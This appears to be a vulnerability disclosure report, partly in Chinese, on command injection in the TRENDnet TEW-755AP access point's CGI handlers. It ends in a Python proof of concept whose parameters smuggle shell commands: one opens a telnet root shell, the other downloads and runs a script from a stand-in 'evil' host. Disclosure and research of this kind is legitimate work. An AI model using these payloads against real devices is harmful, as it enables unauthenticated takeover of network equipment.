# Technical Report: CVE-XXXX-XXXX: TEW-755AP cgi/ssi Multi-Vector Command Injection

## Normalized Submission Metadata

| Field | Value |
|---|---|
| Vendor | TRENDnet |
| Product | TRENDnet TEW-755AP Access Point |
| Firmware / Version | version per source report |
| Affected Component | cgi/ssi |
| Vulnerability Type | Command Injection / RCE |
| CWE | CWE-77 |
| CVSS | 9.8 Critical |
| Source Material | E:\competition\漏洞\vulns\vulns\vuln-755ap-ssi-command-injection |

## Executive Summary

The team-provided report describes a CVE-level vulnerability in TRENDnet TEW-755AP Access Point affecting cgi/ssi. The issue is categorized as Command Injection / RCE and is supported by the copied PoC and evidence files in this package.

## Original Technical Detail

The original report is embedded below for reviewer convenience. The untouched copy is also available at source/REPORT.original.md.

---

# CVE-XXXX-XXXX: TEW-755AP cgi/ssi Multi-Vector Command Injection

| 厂商 TRENDnet | 产品 TEW-755AP v1.1.07b07 | CWE-77 | CVSS **9.8** |

## FirmRec 验证

```
0x42C9FC: frame=168B $ra@sp+164 — getenv("wan_type") → system() ★ 2 ra-loads
0x43BAB4: frame=992B — query_vars("auth_passwd") → system()       ← 认证密码注入!
0x43BAB4: frame=992B — query_vars("log_email_server") → system() ← 邮件服务器注入!
0x436EF4: frame=128B — getenv("filename") → _system()             ← 文件操作注入
0x459964: frame=736B — getenv("REMOTE_ADDR") → popen()            ← ping 注入
```

共 **18 个命令注入点**（含 safe_getenv 路径的 _system 调用）。Simexp: 374 日志全中 0x41414141。

## PoC
```python
import requests
# 认证密码处命令注入（无认证！设置向导页面）
requests.get("http://TEW-755AP/cgi-bin/setup.cgi", params={
    "auth_passwd": "admin; telnetd -p 9999 -l /bin/sh;#"})
# log_email_server 注入
requests.post("http://TEW-755AP/cgi-bin/email.cgi", data={
    "log_email_server": "smtp.test.com; wget http://evil/sh -O /tmp/sh;sh /tmp/sh;#"})
```

